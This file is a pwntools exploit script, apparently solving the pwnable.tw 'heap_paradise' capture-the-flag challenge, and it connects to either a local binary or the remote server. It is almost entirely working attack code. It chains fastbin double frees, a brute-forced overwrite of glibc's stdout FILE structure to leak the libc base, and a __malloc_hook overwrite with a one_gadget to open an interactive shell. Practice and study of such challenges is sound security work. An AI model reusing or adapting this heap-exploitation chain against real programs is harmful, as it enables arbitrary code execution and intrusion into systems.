from pwn import *
import random

local = True

if local:
	r = process("./heap_paradise")
	stdin_off = 0x3c5710
	malloc_hook_off = 0x3c4b10
	one_gadget = 0xf02a4
	#sys_off = 0x45390
else:
	r = remote("chall.pwnable.tw", 10308)
	stdin_off = 0x3c4710
	malloc_hook_off = 0x3c3b10
	one_gadget = 0xef6c4

r.recvuntil("You Choice:")

def alocate(size, data):
	r.sendline(str(1))
	r.recvuntil("Size :")
	r.sendline(str(size))
	try:
		r.recvuntil("Data :")
	except:
		print "Fail1: Corrupted size"
		print "Bruteforcing, so try again, 1/16% to get accessed xD"
		exit(0)
	r.send(data)
	try:
		return r.recvuntil("You Choice:")
	except:
		print "Fail2: Not write location"
		print "Bruteforcing, so try again, 1/16% to get accessed xD"
		exit(0)

def free(index):
	r.sendline(str(2))
	r.recvuntil("Index :")
	r.sendline(str(index))
	r.recvuntil("You Choice:")	

# create 2 chunk with size 0x68 (will become chunk.size=0x71)
# to make double free attack 
alocate(0x68, "\n")   # 0
# set meta data of the next chunk of our fake chunk
payload = "\x00"*0x48 + p64(0x21)
alocate(0x68, payload)   # 1

# make double free attack
free(0)
free(1)
free(0)

# our fake chunk will be in heap+0x10
payload = "\x10"
alocate(0x68, payload)   # 2

alocate(0x68, "\n")   # 3

# set up size of our fake chunk
payload = p64(0) + p64(0x71)
alocate(0x68, payload)   # 4

# this malloc will point our fake chunk 0x...10
alocate(0x68, "\n")   # 5

# free and malloc again to change size of our fake chunk to unsorted bin range
free(0)

# 0xd0 is fine because > 0x80
payload = p64(0) + p64(0xb1)
alocate(0x68, payload)   # 6

# free our fake chunk, now unsorted bin will point to it
free(5)

free(0)
free(1)
free(0)

payload = "\x10"
alocate(0x68, payload)   # 7
alocate(0x68, "\n")   # 8


# brute force 4bit
IO_2_1_stderr__wide_data = stdin_off - 0x130
chunk = IO_2_1_stderr__wide_data + 5 - 8
rd = random.randint(0, 15)
last2off = (chunk + rd*0x1000) & 0xffff
last2off = hex(last2off)[2:]
last2off = last2off.decode("hex")[::-1]


payload = p64(0) + p64(0x71) + last2off
alocate(0x68, payload)   # 9

#gdb.attach(r)

# this malloc will return 0x...10
# and then, then fastbin now hold our file_structure addr
alocate(0x68, "\n")   # 10

# this will return our the memory of file structure
# and now we can overwrite _IO_2_1_stdout_._IO_write_base
stdout_leak = stdin_off - 0x168
stdout_leak = stdout_leak & 0xff
payload = "\x00"*3 + p64(0)*5 + p64(0)   # overwrote _IO_2_1_stderr_
payload += p64(0xfbad1800) + p64(0)*3 + chr(stdout_leak) + last2off[1:]
result = alocate(0x68, payload)   # 11
print result

# Now we already overwrite _flag and _IO_write_base
# The next stdout dunction call will leak libc_addr (already in result variable)
# puts("***********************")
# This is really horrible

# 179 is normal len of output we can get if we don't touch _IO_2_1_stdout
# that means if we touch successfully the output will longer than that 
if len(result) <= 179:
	print "Fail3: Write to another location, NOT _IO_2_1_stdout_"
	print "Bruteforcing, so try again, 1/16% to get accessed xD"
	exit(0)
# leak first 8byte is enough
result = result[:8]
result = u64(result)
libc_base = result + 0xf0 - stdin_off

print hex(libc_base)

# make double free attack to overwrite malloc_hook
free(0)
free(1)
free(0)

malloc_hook_addr = libc_base + malloc_hook_off
target = malloc_hook_addr - 0x20 + 5 - 8
alocate(0x68, p64(target))   # 12

alocate(0x68, "\n")   # 13

alocate(0x68, "\n")   # 14

# use one_gadget of system
payload = "\x00"*3 + p64(0)*2 + p64(one_gadget + libc_base)
alocate(0x68, payload)   # 15

# trigger error to make program call _malloc_hook
free(0)
#free(0)
r.sendline(str(2))
r.recvuntil("Index :")
r.sendline("0")

r.interactive()